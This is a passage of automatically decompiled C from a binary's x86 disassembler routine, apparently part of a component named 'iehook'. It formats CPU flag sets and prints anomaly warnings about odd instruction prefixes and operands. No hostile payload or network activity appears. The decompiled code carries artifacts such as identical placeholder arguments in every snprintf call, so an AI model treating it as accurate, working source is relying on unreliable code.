            int32_t v741 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e31c
            v739 = *v9 + (char)v741;
            *v9 = v739;
        }
        char v742 = v739; // 0x1000e333
        char v743 = v742; // 0x1000e331
        if ((v605 & 2048) != 0) {
            int32_t v744 = v742; // 0x1000e333
            *v26 = (int32_t)"NS ";
            *v28 = v742 == -1 ? 0 : 256 - v744;
            *v29 = v609 + v744;
            int32_t v745 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e35a
            v743 = *v9 + (char)v745;
            *v9 = v743;
        }
        char v746 = v743; // 0x1000e371
        char v747 = v746; // 0x1000e36f
        if ((int16_t)v605 <= 0xffff) {
            int32_t v748 = v746; // 0x1000e371
            *v26 = (int32_t)"D ";
            *v28 = v746 == -1 ? 0 : 256 - v748;
            *v29 = v609 + v748;
            int32_t v749 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e398
            v747 = *v9 + (char)v749;
            *v9 = v747;
        }
        // 0x1000e3a6
        *(char *)(v609 + (int32_t)v747) = 125;
        char v750 = *v9 + 1; // 0x1000e3b2
        *v9 = v750;
        v607 = v750;
    }
    int32_t v751 = *(int32_t *)(a1 + 728); // 0x1000e3b8
    char v752; // 0x1000b7b0
    char v753; // 0x1000b7b0
    int32_t v754; // 0x1000b7b0
    int32_t v755; // 0x1000b7b0
    int32_t v756; // 0x1000b7b0
    if (v751 == 0) {
        goto lab_0x1000ec7c;
    } else {
        char v757 = v607; // 0x1000e3ce
        char v758 = v757; // 0x1000e3c8
        if ((v751 & 7) != 0) {
            int32_t v759 = v757; // 0x1000e3ce
            *v26 = (int32_t)"SET:{ ";
            *v28 = v757 == -1 ? 0 : 256 - v759;
            int32_t v760 = a1 + 8;
            *v29 = v760 + v759;
            int32_t v761 = __snprintf((char *)v751, (int32_t)&g173, (char *)&g173); // 0x1000e3f5
            char v762 = *v9 + (char)v761; // 0x1000e3fa
            *v9 = v762;
            char v763 = v762; // 0x1000e40d
            if ((v751 & 1) != 0) {
                int32_t v764 = v762; // 0x1000e400
                *v26 = (int32_t)"C ";
                *v28 = v762 == -1 ? 0 : 256 - v764;
                *v29 = v760 + v764;
                int32_t v765 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e430
                v763 = *v9 + (char)v765;
                *v9 = v763;
            }
            char v766 = v763; // 0x1000e444
            char v767 = v766; // 0x1000e442
            if ((v751 & 2) != 0) {
                int32_t v768 = v766; // 0x1000e444
                *v26 = (int32_t)"D ";
                *v28 = v766 == -1 ? 0 : 256 - v768;
                *v29 = v760 + v768;
                int32_t v769 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e46b
                v767 = *v9 + (char)v769;
                *v9 = v767;
            }
            char v770 = v767; // 0x1000e47f
            char v771 = v770; // 0x1000e47d
            if ((v751 & 4) != 0) {
                int32_t v772 = v770; // 0x1000e47f
                *v26 = (int32_t)"I ";
                *v28 = v770 == -1 ? 0 : 256 - v772;
                *v29 = v760 + v772;
                int32_t v773 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e4a6
                v771 = *v9 + (char)v773;
                *v9 = v771;
            }
            // 0x1000e4b4
            *(char *)(v760 + (int32_t)v771) = 125;
            v758 = *v9 + 1;
            *v9 = v758;
        }
        char v774 = v758; // 0x1000e4d4
        v753 = v774;
        if ((v751 & 0x7803f8) == 0) {
            goto lab_0x1000e7fe;
        } else {
            int32_t v775 = v774; // 0x1000e4d4
            *v26 = (int32_t)"CLR:{ ";
            *v28 = v774 == -1 ? 0 : 256 - v775;
            v756 = a1 + 8;
            *v29 = v756 + v775;
            int32_t v776 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e4fb
            char v777 = *v9 + (char)v776; // 0x1000e500
            *v9 = v777;
            char v778 = v777; // 0x1000e513
            if ((v751 & 8) != 0) {
                int32_t v779 = v777; // 0x1000e506
                *v26 = (int32_t)"S ";
                *v28 = v777 == -1 ? 0 : 256 - v779;
                *v29 = v756 + v779;
                int32_t v780 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e536
                v778 = *v9 + (char)v780;
                *v9 = v778;
            }
            char v781 = v778; // 0x1000e54b
            char v782 = v781; // 0x1000e549
            if ((v751 & 16) != 0) {
                int32_t v783 = v781; // 0x1000e54b
                *v26 = (int32_t)"Z ";
                *v28 = v781 == -1 ? 0 : 256 - v783;
                *v29 = v756 + v783;
                int32_t v784 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e572
                v782 = *v9 + (char)v784;
                *v9 = v782;
            }
            char v785 = v782; // 0x1000e587
            char v786 = v785; // 0x1000e585
            if ((v751 & 32) != 0) {
                int32_t v787 = v785; // 0x1000e587
                *v26 = (int32_t)"A ";
                *v28 = v785 == -1 ? 0 : 256 - v787;
                *v29 = v756 + v787;
                int32_t v788 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e5ae
                v786 = *v9 + (char)v788;
                *v9 = v786;
            }
            char v789 = v786; // 0x1000e5c3
            char v790 = v789; // 0x1000e5c1
            if ((v751 & 64) != 0) {
                int32_t v791 = v789; // 0x1000e5c3
                *v26 = (int32_t)"C ";
                *v28 = v789 == -1 ? 0 : 256 - v791;
                *v29 = v756 + v791;
                int32_t v792 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e5ea
                v790 = *v9 + (char)v792;
                *v9 = v790;
            }
            char v793 = v790; // 0x1000e5ff
            char v794 = v793; // 0x1000e5fd
            if ((char)v751 < 0) {
                int32_t v795 = v793; // 0x1000e5ff
                *v26 = (int32_t)"D ";
                *v28 = v793 == -1 ? 0 : 256 - v795;
                *v29 = v756 + v795;
                int32_t v796 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e626
                v794 = *v9 + (char)v796;
                *v9 = v794;
            }
            char v797 = v794; // 0x1000e63e
            char v798 = v797; // 0x1000e63c
            if ((v751 & 256) != 0) {
                int32_t v799 = v797; // 0x1000e63e
                *v26 = (int32_t)"I ";
                *v28 = v797 == -1 ? 0 : 256 - v799;
                *v29 = v756 + v799;
                int32_t v800 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e665
                v798 = *v9 + (char)v800;
                *v9 = v798;
            }
            char v801 = v798; // 0x1000e67d
            char v802 = v801; // 0x1000e67b
            if ((v751 & 512) != 0) {
                int32_t v803 = v801; // 0x1000e67d
                *v26 = (int32_t)"O ";
                *v28 = v801 == -1 ? 0 : 256 - v803;
                *v29 = v756 + v803;
                int32_t v804 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e6a4
                v802 = *v9 + (char)v804;
                *v9 = v802;
            }
            unsigned char v805 = v802; // 0x1000e6f7
            if ((v751 & 0x780000) != 0x780000) {
                char v806 = v805; // 0x1000e6f5
                if ((v751 & 0x80000) != 0) {
                    int32_t v807 = v805; // 0x1000e6f7
                    *v26 = (int32_t)"FPU_C0 ";
                    *v28 = v805 == -1 ? 0 : 256 - v807;
                    *v29 = v756 + v807;
                    int32_t v808 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e71e
                    v806 = *v9 + (char)v808;
                    *v9 = v806;
                }
                char v809 = v806; // 0x1000e736
                char v810 = v809; // 0x1000e734
                if ((v751 & 0x100000) != 0) {
                    int32_t v811 = v809; // 0x1000e736
                    *v26 = (int32_t)"FPU_C1 ";
                    *v28 = v809 == -1 ? 0 : 256 - v811;
                    *v29 = v756 + v811;
                    int32_t v812 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e75d
                    v810 = *v9 + (char)v812;
                    *v9 = v810;
                }
                char v813 = v810; // 0x1000e775
                char v814 = v813; // 0x1000e773
                if ((v751 & 0x200000) != 0) {
                    int32_t v815 = v813; // 0x1000e775
                    *v26 = (int32_t)"FPU_C2 ";
                    *v28 = v813 == -1 ? 0 : 256 - v815;
                    *v29 = v756 + v815;
                    int32_t v816 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e79c
                    v814 = *v9 + (char)v816;
                    *v9 = v814;
                }
                char v817 = v814; // 0x1000e7b4
                v752 = v817;
                if ((v751 & 0x400000) == 0) {
                    goto lab_0x1000e7e9;
                } else {
                    int32_t v818 = v817; // 0x1000e7b4
                    *v26 = (int32_t)"FPU_C3 ";
                    v754 = v817 == -1 ? 0 : 256 - v818;
                    v755 = v818;
                    goto lab_0x1000e7d2;
                }
            } else {
                int32_t v819 = v805; // 0x1000e6c5
                if (v805 == -1) {
                    // 0x1000e6e4
                    *v26 = (int32_t)"FPU_ALL ";
                    v754 = 0;
                    v755 = v819;
                } else {
                    // 0x1000e6d0
                    *v26 = (int32_t)"FPU_ALL ";
                    v754 = 256 - v819;
                    v755 = v819;
                }
                goto lab_0x1000e7d2;
            }
        }
    }
  lab_0x1000d8e0:
    if (v6 == 0) {
        uint32_t v820 = *v8; // 0x1000d8e8
        uint32_t v821 = *v25 + v820; // 0x1000d8ef
        *v26 = *v27 + v820 / 0x80000000 + (int32_t)(v821 < v820);
        *v28 = v821;
        *v29 = (int32_t)"[0x%08I64X] ANOMALY: use of unexpected segment FS\n";
        _printf((char *)&g173);
    }
    // 0x1000d96c
    *v14 = *v14 | 16;
    goto lab_0x1000d973;
  lab_0x1000d91d:
    if (v6 == 0) {
        uint32_t v839 = *v8; // 0x1000d921
        uint32_t v840 = *v25 + v839; // 0x1000d928
        *v26 = *v27 + v839 / 0x80000000 + (int32_t)(v840 < v839);
        *v28 = v840;
        *v29 = (int32_t)"[0x%08I64X] ANOMALY: use of unexpected segment GS\n";
        _printf((char *)&g173);
    }
    // 0x1000d96c
    *v14 = *v14 | 16;
    goto lab_0x1000d973;
  lab_0x1000f61f_2:;
    // 0x1000f61f
    int16_t * v841; // 0x1000b7b0
    int32_t v842; // 0x1000b7b0
    int32_t v843; // 0x1000b7b0
    char v844; // 0x1000fb61
    if ((*v132 & 2048) == 0) {
        goto lab_0x1000f936;
    } else {
        int32_t v845 = *v130; // 0x1000f62f
        if (v845 > 2049) {
            if (v845 > 0x2001) {
                goto lab_0x1000f894;
            } else {
                if (v845 == 0x2001) {
                    goto lab_0x1000f8d7;
                } else {
                    // 0x1000f9e3
                    g168 = v845 - 2050;
                    switch (v845) {
                        case 2050: {
                            int32_t v846 = *v140; // 0x1000f9f8
                            int16_t * v847 = (int16_t *)(a1 + 342);
                            if (v846 != 1) {
                                goto lab_0x1000fa0b;
                            } else {
                                int16_t v848 = *v847; // 0x1000fa01
                                if (v848 != 0) {
                                    goto lab_0x1000fa22;
                                } else {
                                    goto lab_0x1000fa0b;
                                }
                            }
                        }
                        case 2051: {
                            // 0x1000fab5
                            *(int32_t *)(a1 + 912) = -(int32_t)(8 * *v45 & 120);
                            goto lab_0x1000f769;
                        }
                        case 2052: {
                            // 0x1000fade
                            *(int32_t *)(a1 + 912) = (int32_t)(8 * *v45 & 120);
                            if ((*v14 & 16) == 0) {
                                // 0x1000fafa
                                if ((*v823 & 4) != 0) {
                                    if (v6 == 0) {
                                        uint32_t v849 = *v8; // 0x1000fb06
                                        uint32_t v850 = *v25 + v849; // 0x1000fb0d
                                        *v26 = *v27 + v849 / 0x80000000 + (int32_t)(v850 < v849);
                                        *v28 = v850;
                                        *v29 = (int32_t)"[0x%08I64X] ANOMALY: Unexpected address size prefix\n";
                                        _printf((char *)&g173);
                                    }
                                    // 0x1000fb28
                                    *v14 = *v14 | 16;
                                }
                            }
                            // 0x1000fb2f
                            *v823 = *v823 & -5;
                            int32_t v851 = *(int32_t *)(*v1 + 4); // 0x1000fb36
                            if (v851 == 1) {
                                // 0x1000f9c1
                                *v45 = *v45 & 15 | 64;
                                goto lab_0x1000f8d7;
                            } else {
                                int32_t v852 = v851 - 2; // 0x1000fb40
                                v842 = v852;
                                if (v852 != 0) {
                                    goto lab_0x1000f845;
                                } else {
                                    // 0x1000fb47
                                    *v45 = *v45 & 15 | 32;
                                    goto lab_0x1000f8d7;
                                }
                            }
                        }
                        case 2053: {
                            // 0x1000fb58
                            v844 = *v14 | 2;
                            *v14 = v844;
                            goto lab_0x1000fa29;
                        }
                        case 2054: {
                            // 0x1000fb6d
                            *v14 = *v14 | 2;
                            *(int32_t *)(a1 + 912) = (int32_t)*(int16_t *)(a1 + 342);
                            goto lab_0x1000f769;
                        }
                        case 2055: {
                            // 0x1000fb86
                            if ((*v14 & 16) == 0) {
                                int32_t v853 = *(int32_t *)(a1 + 480); // 0x1000fb93
                                char v854; // 0x1000fb86
                                char v855 = v854; // 0x1000fba0
                                if ((v853 & 3) != 0) {
                                    char v856 = v854; // 0x1000fba5
                                    if (v6 == 0) {
                                        uint32_t v857 = *v8; // 0x1000fba7
                                        int32_t v858 = *v25; // 0x1000fbae
                                        uint32_t v859 = v858 + v857; // 0x1000fbae
                                        int32_t v860 = *v27; // 0x1000fbb4
                                        *v26 = v860 + v857 / 0x80000000 + (int32_t)(v859 < v857);
                                        *v28 = v859;
                                        *v29 = (int32_t)"[0x%08I64X] ANOMALY: ENTER has invalid operand 2\n";
                                        _printf((char *)&g173);
                                        char v861 = *v14;
                                        v856 = v861;
                                    }
                                    char v862 = v856; // 0x1000fbc9
                                    char v863 = v862 | 16; // 0x1000fbc9
                                    *v14 = v863;
                                    v855 = v863;
                                }
                                char v864 = v855;
                                int32_t v865 = *(int32_t *)(a1 + 592); // 0x1000fbd0
                                int32_t v866 = *(int32_t *)(a1 + 596); // 0x1000fbd9
                                char v867 = v864; // 0x1000fbdf
                                if ((v865 & -32 || v866) != 0) {
                                    char v868 = v864; // 0x1000fbe5
                                    if (v6 == 0) {
                                        uint32_t v869 = *v8; // 0x1000fbe7
                                        int32_t v870 = *v25; // 0x1000fbee
                                        uint32_t v871 = v870 + v869; // 0x1000fbee
                                        int32_t v872 = *v27; // 0x1000fbf4
                                        *v26 = v872 + v869 / 0x80000000 + (int32_t)(v871 < v869);
                                        *v28 = v871;
                                        *v29 = (int32_t)"[0x%08I64X] ANOMALY: ENTER has invalid operand 3\n";
                                        _printf((char *)&g173);
                                        char v873 = *v14;
                                        v868 = v873;
                                    }
                                    char v874 = v868; // 0x1000fc09
                                    char v875 = v874 | 16; // 0x1000fc09
                                    *v14 = v875;
                                    v867 = v875;
                                }
                                char v876 = v867; // 0x1000fc10
                                if ((v876 & 16) == 0) {
                                    char v877 = *v823; // 0x1000fc19
                                    if ((v877 & 4) != 0) {
                                        char v878 = v876; // 0x1000fc23
                                        if (v6 == 0) {
                                            uint32_t v879 = *v8; // 0x1000fc25
                                            int32_t v880 = *v25; // 0x1000fc2c
                                            uint32_t v881 = v880 + v879; // 0x1000fc2c
                                            int32_t v882 = *v27; // 0x1000fc32
                                            *v26 = v882 + v879 / 0x80000000 + (int32_t)(v881 < v879);
                                            *v28 = v881;
                                            *v29 = (int32_t)"[0x%08I64X] ANOMALY: Unexpected address size prefix\n";
                                            _printf((char *)&g173);
                                            char v883 = *v14;
                                            v878 = v883;
                                        }
                                        char v884 = v878; // 0x1000fc47
                                        *v14 = v884 | 16;
                                    }
                                }
                            }
                            // 0x1000fc4e
                            *v823 = *v823 & -5;
                            int32_t v885 = *(int32_t *)(*v1 + 4); // 0x1000fc55
                            if (v885 == 1) {
                                // 0x1000fc7b
                                *v45 = *v45 & 15 | 64;
                            } else {
                                int32_t v886 = v885 - 2; // 0x1000fc5b
                                if (v886 == 0) {
                                    // 0x1000fc6f
                                    *v45 = *v45 & 15 | 32;
                                } else {
                                    if (v886 == 1) {
                                        // 0x1000fc61
                                        *v45 = *v45 & 15 | -128;
                                    }
                                }
                            }
                            int32_t * v887 = (int32_t *)(a1 + 592); // 0x1000fc87
                            *v887 = *v887 & 31;
                            *(int32_t *)(a1 + 596) = 0;
                            int16_t * v888 = (int16_t *)(a1 + 342); // 0x1000fc9e
                            int32_t v889 = -((*(int32_t *)(a1 + 480) + (int32_t)*v888)); // 0x1000fca7
                            int32_t * v890 = (int32_t *)(a1 + 912); // 0x1000fca9
                            *v890 = v889;
                            *v890 = v889 - *v887 * (int32_t)*v888;
                            goto lab_0x1000f8d7;
                        }
                        case 2056: {
                            char v891 = *v14; // 0x1000fcca
                            if ((v891 & 16) == 0) {
                                // 0x1000fcd3
                                if ((*v823 & 4) != 0) {
                                    char v892 = v891; // 0x1000fcdd
                                    if (v6 == 0) {
                                        uint32_t v893 = *v8; // 0x1000fcdf
                                        uint32_t v894 = *v25 + v893; // 0x1000fce6
                                        *v26 = *v27 + v893 / 0x80000000 + (int32_t)(v894 < v893);
                                        *v28 = v894;
                                        *v29 = (int32_t)"[0x%08I64X] ANOMALY: Unexpected address size prefix\n";
                                        _printf((char *)&g173);
                                        v892 = *v14;
                                    }
                                    // 0x1000fd01
                                    *v14 = v892 | 16;
                                }
                            }
                            // 0x1000fd08
                            *v823 = *v823 & -5;
                            int32_t v895 = *(int32_t *)(*v1 + 4); // 0x1000fd0f
                            if (v895 == 1) {
                                // 0x1000f9c1
                                *v45 = *v45 & 15 | 64;
                                goto lab_0x1000f8d7;
                            } else {
                                int32_t v896 = v895 - 2; // 0x1000fd19
                                v842 = v896;
                                if (v896 == 0) {
                                    // 0x1000fb47
                                    *v45 = *v45 & 15 | 32;
                                    goto lab_0x1000f8d7;
                                } else {
                                    goto lab_0x1000f845;
                                }
                            }
                        }
                        default: {
                            goto lab_0x1000f894;
                        }
                    }
                }
            }
        } else {
            if (v845 == 2049) {
                // 0x1000f98b
                v841 = (int16_t *)(a1 + 342);
                if (*v140 != 1) {
                    goto lab_0x1000f99e;
                } else {
                    int16_t v897 = *v841; // 0x1000f994
                    int16_t v898 = v897; // 0x1000f99c
                    if (v897 != 0) {
                        // 0x1000f9b5
                        v843 = v898;
                        goto lab_0x1000f7eb;
                    } else {
                        goto lab_0x1000f99e;
                    }
                }
            } else {
                if (v845 > 514) {
                    switch (v845) {
                        case 515: {
                            int32_t v899 = *(int32_t *)(a1 + 480); // 0x1000f966
                            if ((*(int32_t *)(a1 + 484) || v899) != 0) {
                                // 0x1000f978
                                *(int32_t *)(a1 + 912) = -v899;
                            }
                            goto lab_0x1000f8d7;
                        }
                        case 1025: {
                            goto lab_0x1000f8d7;
                        }
                        default: {
                            goto lab_0x1000f894;
                        }
                    }
                } else {
                    if (v845 > 512) {
                        int32_t v900 = *(int32_t *)(a1 + 480); // 0x1000f866
                        if ((*(int32_t *)(a1 + 484) || v900) != 0) {
                            // 0x1000f874
                            *(int32_t *)(a1 + 912) = v900;
                        }
                        goto lab_0x1000f8d7;
                    } else {
                        int32_t v901 = v845 - 259; // 0x1000f65c
                        if (v901 == 0) {
                            // 0x1000f7e4
                            v843 = (int32_t)(*v45 & 15);
                            goto lab_0x1000f7eb;
                        } else {
                            if (v901 != 2) {
                                goto lab_0x1000f894;
                            } else {
                                unsigned char v902 = *v45 & 15;
                                int32_t v903 = v902; // 0x1000f677
                                int32_t * v904 = (int32_t *)(a1 + 912); // 0x1000f680
                                *v904 = v903;
                                switch (v430) {
                                    case 194: {
                                        char v905 = *v14; // 0x1000f717
                                        int32_t * v906 = (int32_t *)(a1 + 368);
                                        int32_t v907 = v903; // 0x1000f71e
                                        if ((v905 & 16) == 0) {
                                            // 0x1000f720
                                            v907 = v903;
                                            if ((*v906 & 3) != 0) {
                                                char v908 = v905; // 0x1000f732
                                                if (v6 == 0) {
                                                    uint32_t v909 = *v8; // 0x1000f734
                                                    uint32_t v910 = *v25 + v909; // 0x1000f73b
                                                    *v26 = *v27 + v909 / 0x80000000 + (int32_t)(v910 < v909);
                                                    *v28 = v910;
                                                    *v29 = (int32_t)"[0x%08I64X] ANOMALY: ret has invalid operand 1\n";
                                                    _printf((char *)&g173);
                                                    v908 = *v14;
                                                }
                                                // 0x1000f756
                                                *v14 = v908 | 16;
                                                v907 = *v904;
                                            }
                                        }
                                        // 0x1000f75d
                                        *v904 = *v906 + v907;
                                        // break -> 0x1000f769
                                        break;
                                    }
                                    case 202: {
                                        char v911 = *v14; // 0x1000f6b3
                                        int32_t * v912 = (int32_t *)(a1 + 368);
                                        int32_t v913 = v903; // 0x1000f6ba
                                        if ((v911 & 16) == 0) {
                                            // 0x1000f6bc
                                            v913 = v903;
                                            if ((*v912 & 3) != 0) {
                                                char v914 = v911; // 0x1000f6ce
                                                if (v6 == 0) {
                                                    uint32_t v915 = *v8; // 0x1000f6d0
                                                    uint32_t v916 = *v25 + v915; // 0x1000f6d7
                                                    *v26 = *v27 + v915 / 0x80000000 + (int32_t)(v916 < v915);
                                                    *v28 = v916;
                                                    *v29 = (int32_t)"[0x%08I64X] ANOMALY: retf has invalid operand 1\n";
                                                    _printf((char *)&g173);
                                                    v914 = *v14;
                                                }
                                                // 0x1000f6f2
                                                *v14 = v914 | 16;
                                                v913 = *v904;
                                            }
                                        }
                                        int32_t v917 = 2 * v913; // 0x1000f6ff
                                        *v904 = v917;
                                        *v904 = *v912 + v917;
                                        // break -> 0x1000f769
                                        break;
                                    }
                                    default: {
                                        if (v430 == 203) {
                                            int32_t v918 = 2 * v902; // 0x1000f698
                                            *v904 = v918;
                                            *v904 = *(int32_t *)(a1 + 368) + v918;
                                        }
                                        // break -> 0x1000f769
                                        break;
                                    }
                                }
                                goto lab_0x1000f769;
                            }
                        }
                    }
                }
            }
        }
    }
  lab_0x1000d89c:
    if (v6 == 0) {
        uint32_t v919 = *v8; // 0x1000d8a4
        uint32_t v920 = *v25 + v919; // 0x1000d8ab
        *v26 = *v27 + v919 / 0x80000000 + (int32_t)(v920 < v919);
        *v28 = v920;
        *v29 = (int32_t)"[0x%08I64X] ANOMALY: use of unexpected segment ES\n";
        _printf((char *)&g173);
    }
    // 0x1000d96c
    *v14 = *v14 | 16;
    goto lab_0x1000d973;
  lab_0x1000f936:
    // 0x1000f936
    if ((*v132 & 0x40000) != 0) {
        // 0x1000f946
        if (*v130 < 0x40009) {
            char v921 = *v14; // 0x1000f95a
            *v14 = v921 | 2;
        } else {
            // 0x1000fd25
            *v26 = 2484;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)&g3;
            __wassert();
        }
    }
    // 0x1000fd3c
    int32_t * v922; // 0x1000fd6d
    if ((*v132 & 0x80000) == 0) {
        // 0x1000fd6a
        v922 = (int32_t *)(v2 + 956);
        *v922 = *v922 + 1;
        return 1;
    }
    // 0x1000fd48
    switch (*v130) {
        default: {
            // 0x1000fd63
            *v14 = *v14 | 2;
        }
        case 0x80008: {
        }
        case 0x80007: {
        }
        case 0x80004: {
            // 0x1000fd6a
            v922 = (int32_t *)(v2 + 956);
            *v922 = *v922 + 1;
            return 1;
        }
    }
  lab_0x1000e7fe:;
    char v923 = v753; // 0x1000e812
    char v924 = v923; // 0x1000e80c
    char v925; // 0x1000b7b0
    int32_t v926; // 0x1000b7b0
    int32_t v927; // 0x1000b7b0
    if ((v751 & 0x783fc00) != 0x783fc00) {
        goto lab_0x1000ebfa;
    } else {
        int32_t v928 = v923; // 0x1000e812
        *v26 = (int32_t)"MOD:{ ";
        *v28 = v923 == -1 ? 0 : 256 - v928;
        v927 = a1 + 8;
        *v29 = v927 + v928;
        int32_t v929 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e839
        char v930 = *v9 + (char)v929; // 0x1000e841
        *v9 = v930;
        int32_t v931 = v930; // 0x1000e847
        if ((v751 & 0x3fc00) != 0x3fc00) {
            if ((v751 & 0xfc00) != 0xfc00) {
                char v932 = v930; // 0x1000e8cf
                if ((v751 & 1024) != 0) {
                    // 0x1000e8d1
                    *v26 = (int32_t)"O ";
                    *v28 = v930 == -1 ? 0 : 256 - v931;
                    *v29 = v927 + v931;
                    int32_t v933 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e8f1
                    v932 = *v9 + (char)v933;
                    *v9 = v932;
                }
                char v934 = v932; // 0x1000e908
                char v935 = v934; // 0x1000e906
                if ((v751 & 2048) != 0) {
                    int32_t v936 = v934; // 0x1000e908
                    *v26 = (int32_t)"S ";
                    *v28 = v934 == -1 ? 0 : 256 - v936;
                    *v29 = v927 + v936;
                    int32_t v937 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e92f
                    v935 = *v9 + (char)v937;
                    *v9 = v935;
                }
                char v938 = v935; // 0x1000e946
                char v939 = v938; // 0x1000e944
                if ((v751 & 0x1000) != 0) {
                    int32_t v940 = v938; // 0x1000e946
                    *v26 = (int32_t)"Z ";
                    *v28 = v938 == -1 ? 0 : 256 - v940;
                    *v29 = v927 + v940;
                    int32_t v941 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e96d
                    v939 = *v9 + (char)v941;
                    *v9 = v939;
                }
                char v942 = v939; // 0x1000e984
                char v943 = v942; // 0x1000e982
                if ((v751 & 0x2000) != 0) {
                    int32_t v944 = v942; // 0x1000e984
                    *v26 = (int32_t)"A ";
                    *v28 = v942 == -1 ? 0 : 256 - v944;
                    *v29 = v927 + v944;
                    int32_t v945 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e9ab
                    v943 = *v9 + (char)v945;
                    *v9 = v943;
                }
                char v946 = v943; // 0x1000e9c2
                char v947 = v946; // 0x1000e9c0
                if ((v751 & 0x4000) != 0) {
                    int32_t v948 = v946; // 0x1000e9c2
                    *v26 = (int32_t)"P ";
                    *v28 = v946 == -1 ? 0 : 256 - v948;
                    *v29 = v927 + v948;
                    int32_t v949 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000e9e9
                    v947 = *v9 + (char)v949;
                    *v9 = v947;
                }
                char v950 = v947; // 0x1000ea00
                char v951 = v950; // 0x1000e9fe
                if ((int16_t)v751 <= 0xffff) {
                    int32_t v952 = v950; // 0x1000ea00
                    *v26 = (int32_t)"C ";
                    *v28 = v950 == -1 ? 0 : 256 - v952;
                    *v29 = v927 + v952;
                    int32_t v953 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000ea27
                    v951 = *v9 + (char)v953;
                    *v9 = v951;
                }
                char v954 = v951; // 0x1000ea3e
                char v955 = v954; // 0x1000ea3c
                if ((v751 & 0x10000) != 0) {
                    int32_t v956 = v954; // 0x1000ea3e
                    *v26 = (int32_t)"D ";
                    *v28 = v954 == -1 ? 0 : 256 - v956;
                    *v29 = v927 + v956;
                    int32_t v957 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000ea65
                    v955 = *v9 + (char)v957;
                    *v9 = v955;
                }
                char v958 = v955; // 0x1000ea7c
                v925 = v958;
                if ((v751 & 0x20000) == 0) {
                    goto lab_0x1000eab1;
                } else {
                    int32_t v959 = v958; // 0x1000ea7c
                    *v26 = (int32_t)"I ";
                    *v28 = v958 == -1 ? 0 : 256 - v959;
                    v926 = v959;
                    goto lab_0x1000ea9e;
                }
            } else {
                if (v930 == -1) {
                    // 0x1000e8b9
                    *v26 = (int32_t)"FLAGS_COMMON ";
                    *v28 = 0;
                    v926 = v931;
                } else {
                    // 0x1000e8a1
                    *v26 = (int32_t)"FLAGS_COMMON ";
                    *v28 = 256 - v931;
                    v926 = v931;
                }
                goto lab_0x1000ea9e;
            }
        } else {
            if (v930 == -1) {
                // 0x1000e87a
                *v26 = (int32_t)"FLAGS_ALL ";
                *v28 = 0;
                v926 = v931;
            } else {
                // 0x1000e862
                *v26 = (int32_t)"FLAGS_ALL ";
                *v28 = 256 - v931;
                v926 = v931;
            }
            goto lab_0x1000ea9e;
        }
    }
  lab_0x1000ee2d:
    // 0x1000ee2d
    *(int32_t *)(a1 + 896) = 1;
    *(int32_t *)(a1 + 872) = *v960;
    *(int32_t *)(a1 + 876) = *v961;
    *(int32_t *)(a1 + 904) = v962;
    goto lab_0x1000f61f_2;
  lab_0x1000ee1b:
    // 0x1000ee1b
    *v26 = v963;
    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
    *v29 = (int32_t)L"!Instruction->CodeBranch.AddressOffset";
    __wassert();
    v961 = v964;
    v960 = v965;
    goto lab_0x1000ee2d;
  lab_0x1000f203:;
    int32_t v966 = *v8; // 0x1000f203
    *(int32_t *)(a1 + 896) = 2;
    *(int32_t *)(a1 + 872) = *v967;
    uint32_t v968 = *v243; // 0x1000f21f
    *(int32_t *)(a1 + 876) = *v969;
    uint32_t v970 = v968 + v966; // 0x1000f22e
    *(int32_t *)(a1 + 884) = (v966 >> 31) + (int32_t)(v970 < v968);
    *(int32_t *)(a1 + 880) = v970;
    *(int32_t *)(a1 + 904) = v962;
    goto lab_0x1000f61f_2;
  lab_0x1000f1f1:
    // 0x1000f1f1
    *v26 = v971;
    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
    *v29 = (int32_t)L"!Instruction->CodeBranch.AddressOffset";
    __wassert();
    v969 = v972;
    v967 = v973;
    goto lab_0x1000f203;
  lab_0x1000ebfa:
    if ((v751 & 0x40000) != 0) {
        int32_t v974 = v924; // 0x1000ec01
        *v26 = (int32_t)"TOG:{ ";
        *v28 = v924 == -1 ? 0 : 256 - v974;
        int32_t v975 = a1 + 8;
        *v29 = v975 + v974;
        int32_t v976 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000ec28
        unsigned char v977 = *v9 + (char)v976; // 0x1000ec2d
        *v9 = v977;
        int32_t v978 = v977; // 0x1000ec33
        *v26 = (int32_t)"C ";
        *v28 = v977 == -1 ? 0 : 256 - v978;
        *v29 = v975 + v978;
        int32_t v979 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000ec5c
